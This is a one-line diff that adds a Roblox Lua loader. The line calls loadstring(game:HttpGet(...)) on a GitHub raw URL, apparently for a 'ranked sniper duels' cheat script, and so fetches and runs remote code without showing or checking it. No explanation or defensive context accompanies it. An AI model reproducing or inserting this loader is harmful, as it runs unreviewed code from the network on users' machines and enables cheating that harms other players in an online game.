@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/ranked-sniper-duels-spam0-nt6vladrl4ql0k.lua"))()
